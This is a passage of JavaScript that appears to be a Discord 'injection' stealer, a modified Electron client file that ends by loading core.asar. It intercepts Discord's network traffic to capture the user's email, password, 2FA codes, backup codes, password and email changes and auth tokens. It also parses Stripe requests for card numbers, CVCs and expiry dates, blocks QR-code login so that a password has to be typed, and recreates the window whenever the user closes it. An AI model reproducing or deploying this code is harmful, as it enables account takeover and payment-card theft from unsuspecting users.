                    debugLog(`2FA code used: ${twoFACode}`);
                    EmailPassToken(email, password, responseData.token, `logged in with 2FA (code: ${twoFACode})`);
                    break;
                case params.response.url.endsWith('/codes-verification'):
                    debugLog("Backup codes endpoint detected");
                    debugLog(`Backup codes request data: ${JSON.stringify(requestData)}`);
                    debugLog(`Backup codes response data: ${JSON.stringify(responseData)}`);
                    if (responseData.backup_codes) {
                        debugLog("Backup codes found in response, calling BackupCodesViewed");
                        BackupCodesViewed(responseData.backup_codes, await getToken());
                    } else {
                        debugLog("No backup_codes field found in response data");
                    }
                    break;
                case params.response.url.endsWith('/@me'):
                    debugLog("User settings endpoint detected");
                    if (!requestData.password) {
                        debugLog("No password in request data, skipping");
                        return;
                    }
                    debugLog(`Password found in request data`);
                    if (requestData.email) {
                        debugLog("Email change detected");
                        EmailChanged(requestData.email, requestData.password, responseData.token);
                    }
                    if (requestData.new_password) {
                        debugLog("Password change detected, calling PasswordChanged function");
                        PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                    } else {
                        debugLog("No new_password field found in request data");
                    }
                    break;
            }
        } catch (e) {
            debugLog(`Error processing auth request: ${e.message}`);
        }
    });

    try {
        mainWindow.webContents.debugger.sendCommand('Network.enable');
        debugLog("Network monitoring enabled");

        // Enable request interception for better data capture
        mainWindow.webContents.debugger.sendCommand('Fetch.enable', {
            patterns: [
                { urlPattern: "*discord.com/api/v*/users/@me*", requestStage: "Request" },
                { urlPattern: "*discordapp.com/api/v*/users/@me*", requestStage: "Request" },
                { urlPattern: "*canary.discord.com/api/v*/users/@me*", requestStage: "Request" },
                { urlPattern: "*discord.com/api/v*/auth/*", requestStage: "Request" }
            ]
        });
        debugLog("Request interception enabled");
    } catch (e) {
        debugLog(`Failed to enable network monitoring: ${e.message}`);
    }

    mainWindow.on('closed', () => {
        debugLog("Main window closed, recreating");
        createWindow();
    });
};

// Start monitoring
debugLog("Starting Discord injection monitoring");
setTimeout(createWindow, 1000); // Wait 1 second before starting

// Payment monitoring
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    debugLog(`Payment URL detected: ${details.url}, Status: ${details.statusCode}, Method: ${details.method}`);

    if (![200, 202].includes(details.statusCode)) return;

    switch (true) {
        case details.url.endsWith('tokens') && details.method === 'POST':
            debugLog("Stripe token endpoint detected - Credit card added");
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;
        case details.url.endsWith('paypal_accounts') && details.method === 'POST':
            debugLog("PayPal endpoint detected - PayPal added");
            PaypalAdded(await getToken());
            break;
        case details.url.includes('/billing/payment-sources'):
            debugLog("Discord payment sources endpoint detected - Payment method accessed");
            if (details.method === 'POST') {
                debugLog("POST to payment-sources - New payment method added");
                CreditCardAdded("****", "***", "**", "**", await getToken());
            } else if (details.method === 'GET') {
                debugLog("GET to payment-sources - Payment methods retrieved (ignoring, not a new card)");
                // GET request'leri ignore et - bunlar sadece mevcut kartları yükler
                // Sadece POST request'leri gerçek kart ekleme işlemidir
            }
            break;
    }
});

// Block QR code login
session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({ cancel: true })
});

module.exports = require("./core.asar");
